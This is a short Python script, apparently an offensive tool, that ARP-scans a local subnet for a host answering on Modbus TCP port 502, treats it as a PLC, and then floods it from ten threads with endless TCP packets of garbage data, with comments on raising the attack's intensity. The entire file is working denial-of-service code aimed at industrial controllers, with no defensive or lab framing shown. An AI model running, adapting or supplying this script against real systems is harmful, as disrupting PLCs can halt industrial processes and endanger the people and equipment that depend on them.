import scapy.all as scapy
import socket
import time
import threading

# Function to scan the local network to discover the PLC
def find_plc_ip(subnet="192.168.1.0/24"):
    print("[*] Scanning the network to discover PLC...")
    answers, _ = scapy.arping(subnet, verbose=0)
    for sent, received in answers:
        ip = received.psrc
        mac = received.hwsrc
        try:
            # Try connecting to known PLC ports (Example: Modbus TCP port 502)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            result = s.connect_ex((ip, 502))  # Modbus TCP default port
            if result == 0:
                print(f"[+] PLC Found: IP - {ip}, MAC - {mac}")
                return ip
            s.close()
        except:
            pass
    print("[-] No PLC found on the network!")
    return None

# Function to perform a DoS attack on the PLC
def dos_attack(target_ip):
    print(f"[*] Initiating DoS attack on {target_ip}...")
    
    def flood():
        while True:
            # Send random garbage data to Modbus TCP port 502
            try:
                packet = scapy.IP(dst=target_ip) / scapy.TCP(dport=502, sport=scapy.RandShort()) / scapy.Raw(b"GarbageData")
                scapy.send(packet, verbose=0)
            except Exception as e:
                print(f"[!] Error: {e}")
    
    # Launch multiple threads to increase attack intensity
    threads = []
    for _ in range(10):  # Increase the number to amplify the attack
        t = threading.Thread(target=flood)
        t.daemon = True
        threads.append(t)
        t.start()

    print("[+] DoS attack started. Press Ctrl+C to stop.")
    try:
        while True:
            time.sleep(1)  # Keep running
    except KeyboardInterrupt:
        print("\n[!] Attack stopped.")

# Main execution
if __name__ == "__main__":
    plc_ip = find_plc_ip()
    if plc_ip:
        dos_attack(plc_ip)
    else:
        print("[-] Exiting: No PLC found.")